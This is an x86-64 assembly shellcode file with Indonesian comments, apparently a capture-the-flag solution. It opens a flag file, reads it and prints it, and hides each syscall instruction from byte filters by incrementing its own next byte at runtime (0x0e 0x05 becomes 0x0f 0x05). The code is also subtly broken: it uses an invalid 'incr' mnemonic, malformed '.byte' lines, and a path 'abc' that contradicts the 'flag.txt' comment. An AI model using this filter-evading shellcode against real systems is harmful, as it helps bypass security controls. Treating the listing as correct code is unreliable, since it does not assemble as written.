.intel_syntax noprefix
.global _start

_start:

# open('flag.txt',0); -> 0 artinya read doang. flag -> rdi, 0 -> rsi
        lea rdi, [rip + flag_path]
        xor rsi, rsi
        mov rax, 2
        incr byte ptr [rip]
        .byte 0x0e 0x05

# read(fd,buffer,count);
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        incr byte ptr [rip]
        .byte 0x0e 0x05

# note setelah rsp diisi ke rsi, nilai rsp tidak berubah (which mean tetap menunjuk ke awal buffer)

# write(fd,buffer,count)
        mov rdx, rax # karena read mengreturn jumlah byte yg dibaca
        mov rdi, 1   # fd=1 keluarannya di terminal
        mov rsi, rsp # rsp masih menunjuk di awal tempat tadi
        mov rax, 1   # syscall write itu 1
        incr byte ptr [rip]
        .byte 0x0e 0x05

# exit
        xor rdi, rdi # status exit 0
        mov rax, 60  # syscall exit 60
        incr byte ptr [rip]
        .byte 0x0e 0x05

flag_path:
        .string "abc"
